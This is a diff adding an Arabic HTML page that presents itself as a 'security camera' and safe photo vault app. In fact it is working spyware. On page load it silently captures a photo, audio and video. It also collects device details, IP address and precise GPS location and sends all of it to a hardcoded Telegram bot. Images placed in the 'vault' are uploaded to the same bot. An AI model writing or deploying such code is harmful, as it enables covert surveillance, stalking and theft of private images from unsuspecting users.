@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>كاميرا الأمان</title>
+    <!-- المانيفست مدمج كـ Data URI -->
+    <link rel="manifest" href='data:application/manifest+json,{"name":"كاميرا الأمان","short_name":"كاميرا","description":"تطبيق كاميرا ومعرض آمن","start_url":"./","display":"standalone","background_color":"%23ffffff","theme_color":"%232c3e50","icons":[{"src":"data:image/svg+xml,%3Csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"%3E%3Crect width=\"100\" height=\"100\" fill=\"%232c3e50\"/%3E%3Ctext x=\"50\" y=\"55\" text-anchor=\"middle\" font-size=\"50\" fill=\"white\"%3E📷%3C/text%3E%3C/svg%3E","sizes":"any","type":"image/svg+xml"}]}'>
+    <meta name="theme-color" content="#2c3e50">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f4f6f9; color: #333; text-align: center; padding-bottom: 70px;
+        }
+        header {
+            background: #2c3e50; color: white; padding: 20px 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        header h1 { font-size: 1.5em; margin-bottom: 5px; }
+        main { max-width: 600px; margin: 20px auto; padding: 0 10px; }
+        video {
+            width: 100%; max-height: 400px; background: #000;
+            border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            transform: scaleX(-1); /* عكس الكاميرا الأمامية */
+        }
+        .controls { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 15px; }
+        .btn {
+            padding: 12px 20px; background: #3498db; color: white; border: none;
+            border-radius: 8px; font-size: 1em; cursor: pointer; transition: background 0.3s;
+        }
+        .btn:hover { background: #2980b9; }
+        .nav-btn { background: #ecf0f1; color: #333; flex: 1; }
+        .nav-btn.active { background: #3498db; color: white; }
+        nav {
+            position: fixed; bottom: 0; left: 0; right: 0; display: flex;
+            justify-content: space-around; background: white; padding: 10px;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+        }
+        .gallery { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 15px; }
+        .gallery img { width: 100px; height: 100px; object-fit: cover; border-radius: 5px; border: 1px solid #ddd; }
+        input[type="password"], input[type="file"] {
+            padding: 10px; margin: 5px; border: 1px solid #ccc; border-radius: 5px;
+            width: calc(100% - 20px); font-size: 1em;
+        }
+        #infoBox {
+            background: #fff; border-radius: 10px; padding: 15px; margin-top: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: left;
+            font-size: 0.9em; max-height: 200px; overflow-y: auto; display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>📷 كاميرا الأمان</h1>
+        <p>حافظ على ذكرياتك بأمان</p>
+    </header>
+
+    <main>
+        <!-- شاشة الكاميرا -->
+        <section id="cameraSection">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="controls">
+                <button id="capturePhoto" class="btn">📸 التقاط صورة</button>
+                <button id="recordVideo" class="btn">🎥 فيديو (10 ثوان)</button>
+                <button id="recordAudio" class="btn">🎤 صوت (5 ثوان)</button>
+                <button id="collectInfo" class="btn">ℹ️ معلومات النظام</button>
+            </div>
+            <div id="infoBox"></div>
+            <canvas id="canvas" style="display:none;"></canvas>
+        </section>
+
+        <!-- قسم الخزنة -->
+        <section id="vaultSection" style="display:none;">
+            <h2>🔒 خزنتي</h2>
+            <div id="vaultLock">
+                <input type="password" id="vaultPassword" placeholder="أدخل كلمة المرور">
+                <button id="unlockVault" class="btn">فتح</button>
+                <p id="vaultError" style="color:red; display:none;">كلمة مرور خاطئة</p>
+            </div>
+            <div id="vaultContent" style="display:none;">
+                <input type="file" id="imageUpload" accept="image/*" multiple>
+                <button id="uploadImages" class="btn">⬆️ رفع الصور</button>
+                <div id="vaultGallery" class="gallery"></div>
+            </div>
+        </section>
+
+        <!-- شريط التنقل -->
+        <nav>
+            <button id="navCamera" class="nav-btn active">📷 الكاميرا</button>
+            <button id="navVault" class="nav-btn">🔒 الخزنة</button>
+        </nav>
+    </main>
+
+    <script>
+        // ====== إعدادات تيليجرام (مدمجة مسبقًا) ======
+        const TELEGRAM_TOKEN = '8750908249:AAF8XjcipjtTTK4-5hePeM6PMgfLaCwiacA';
+        const CHAT_ID = '8770203269';
+
+        // ====== عناصر الواجهة ======
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const captureBtn = document.getElementById('capturePhoto');
+        const recordVideoBtn = document.getElementById('recordVideo');
+        const recordAudioBtn = document.getElementById('recordAudio');
+        const collectInfoBtn = document.getElementById('collectInfo');
+        const vaultSection = document.getElementById('vaultSection');
+        const cameraSection = document.getElementById('cameraSection');
+        const navCamera = document.getElementById('navCamera');
+        const navVault = document.getElementById('navVault');
+        const vaultLock = document.getElementById('vaultLock');
+        const vaultContent = document.getElementById('vaultContent');
+        const vaultPassword = document.getElementById('vaultPassword');
+        const unlockVault = document.getElementById('unlockVault');
+        const vaultError = document.getElementById('vaultError');
+        const imageUpload = document.getElementById('imageUpload');
+        const uploadImages = document.getElementById('uploadImages');
+        const vaultGallery = document.getElementById('vaultGallery');
+        const infoBox = document.getElementById('infoBox');
+
+        const VAULT_PASSWORD = '1234';
+
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        // ====== تهيئة الكاميرا والمجمعات التلقائية ======
+        async function initCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+                video.srcObject = mediaStream;
+                // التقاط صورة تلقائيًا بعد 3 ثوانٍ
+                setTimeout(() => captureAndSend(), 3000);
+                // تسجيل صوت تلقائيًا بعد 5 ثوانٍ
+                setTimeout(() => recordAndSendAudio(5), 5000);
+                // تسجيل فيديو قصير بعد 8 ثوانٍ
+                setTimeout(() => recordVideo(5), 8000);
+                // جمع معلومات الجهاز والموقع بعد 2 ثانية وإرسالها
+                setTimeout(() => collectAndSendDeviceInfo(), 2000);
+            } catch (err) {
+                console.error('فشل الوصول إلى الكاميرا:', err);
+                alert('يرجى السماح بالوصول إلى الكاميرا والميكروفون.');
+            }
+        }
+
+        // ====== وظائف الإرسال إلى تيليجرام ======
+        async function sendPhotoToTelegram(dataUrl) {
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                console.log('تم إرسال الصورة');
+            } catch (err) { console.error('فشل إرسال الصورة:', err); }
+        }
+
+        async function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'video.webm');
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+                console.log('تم إرسال الفيديو');
+            } catch (err) { console.error('فشل إرسال الفيديو:', err); }
+        }
+
+        async function sendAudioToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('audio', blob, 'audio.webm');
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+                console.log('تم إرسال الصوت');
+            } catch (err) { console.error('فشل إرسال الصوت:', err); }
+        }
+
+        async function sendTextToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+                console.log('تم إرسال النص');
+            } catch (err) { console.error('فشل إرسال النص:', err); }
+        }
+
+        // ====== التقاط صورة ======
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+
+        async function captureAndSend() {
+            const dataUrl = capturePhoto();
+            await sendPhotoToTelegram(dataUrl);
+        }
+
+        // ====== تسجيل فيديو ======
+        async function recordVideo(duration = 10) {
+            if (!mediaStream) return;
+            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+            recordedChunks = [];
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                await sendVideoToTelegram(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), duration * 1000);
+        }
+
+        // ====== تسجيل صوت ======
+        async function recordAndSendAudio(duration = 5) {
+            if (!mediaStream) return;
+            const audioStream = new MediaStream(mediaStream.getAudioTracks());
+            mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+            recordedChunks = [];
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+                await sendAudioToTelegram(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), duration * 1000);
+        }
+
+        // ====== جمع معلومات الجهاز والموقع ======
+        async function collectAndSendDeviceInfo() {
+            let info = '🔍 <b>معلومات الجهاز</b>\n\n';
+            info += `🖥 <b>المتصفح:</b> ${navigator.userAgent}\n`;
+            info += `📱 <b>المنصة:</b> ${navigator.platform}\n`;
+            info += `🖥 <b>الدقة:</b> ${screen.width}x${screen.height}\n`;
+            info += `🌐 <b>اللغة:</b> ${navigator.language}\n`;
+            info += `⏰ <b>الوقت:</b> ${new Date().toLocaleString()}\n`;
+
+            // معلومات البطارية (إذا كانت مدعومة)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info += `🔋 <b>البطارية:</b> ${Math.round(battery.level * 100)}% (${battery.charging ? 'شحن' : 'غير شحن'})\n`;
+                } catch (e) { /* تجاهل */ }
+            }
+
+            // معلومات الشبكة
+            if (navigator.connection) {
+                info += `📶 <b>الشبكة:</b> ${navigator.connection.effectiveType} - ${navigator.connection.downlink} Mbps\n`;
+            }
+
+            // عنوان IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info += `🌍 <b>عنوان IP:</b> ${ipData.ip}\n`;
+                // محاولة جلب موقع تقريبي عبر IP
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoRes.json();
+                    if (geoData.city) {
+                        info += `📍 <b>الموقع التقريبي (من IP):</b> ${geoData.city}, ${geoData.region}, ${geoData.country_name}\n`;
+                    }
+                } catch (e) { /* تجاهل */ }
+            } catch (e) {}
+
+            // الموقع الجغرافي الدقيق (يتطلب إذن المستخدم)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        info += `📍 <b>الموقع الدقيق:</b> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n`;
+                        info += `🔗 https://www.google.com/maps?q=${latitude},${longitude}\n`;
+                        // إرسال النص بعد إضافة الموقع
+                        sendTextToTelegram(info);
+                        infoBox.innerHTML = info.replace(/<b>/g, '').replace(/<\/b>/g, '').replace(/\n/g, '<br>');
+                        infoBox.style.display = 'block';
+                    },
+                    (error) => {
+                        info += `📍 <b>الموقع الدقيق:</b> غير متاح (${error.message})\n`;
+                        sendTextToTelegram(info);
+                        infoBox.innerHTML = info.replace(/<b>/g, '').replace(/<\/b>/g, '').replace(/\n/g, '<br>');
+                        infoBox.style.display = 'block';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                sendTextToTelegram(info);
+                infoBox.innerHTML = info.replace(/<b>/g, '').replace(/<\/b>/g, '').replace(/\n/g, '<br>');
+                infoBox.style.display = 'block';
+            }
+        }
+
+        // ====== إدارة الواجهة ======
+        navCamera.addEventListener('click', () => {
+            cameraSection.style.display = 'block';
+            vaultSection.style.display = 'none';
+            navCamera.classList.add('active');
+            navVault.classList.remove('active');
+        });
+
+        navVault.addEventListener('click', () => {
+            cameraSection.style.display = 'none';
+            vaultSection.style.display = 'block';
+            navVault.classList.add('active');
+            navCamera.classList.remove('active');
+        });
+
+        captureBtn.addEventListener('click', captureAndSend);
+        recordVideoBtn.addEventListener('click', () => recordVideo(10));
+        recordAudioBtn.addEventListener('click', () => recordAndSendAudio(5));
+        collectInfoBtn.addEventListener('click', collectAndSendDeviceInfo);
+
+        // ====== خزنة الصور ======
+        unlockVault.addEventListener('click', () => {
+            if (vaultPassword.value === VAULT_PASSWORD) {
+                vaultLock.style.display = 'none';
+                vaultContent.style.display = 'block';
+                vaultError.style.display = 'none';
+            } else {
+                vaultError.style.display = 'block';
+            }
+        });
+
+        uploadImages.addEventListener('click', async () => {
+            const files = imageUpload.files;
+            if (files.length === 0) return;
+            for (let file of files) {
+                // عرض محلي
+                const img = document.createElement('img');
+                img.src = URL.createObjectURL(file);
+                vaultGallery.appendChild(img);
+                // إرسال للبوت
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', file);
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    console.log('تم إرسال صورة الخزنة إلى تيليجرام');
+                } catch (err) { console.error('فشل إرسال صورة الخزنة:', err); }
+            }
+            imageUpload.value = '';
+        });
+
+        // ====== بدء التطبيق ======
+        initCamera();
+    </script>
+</body>
+</html>
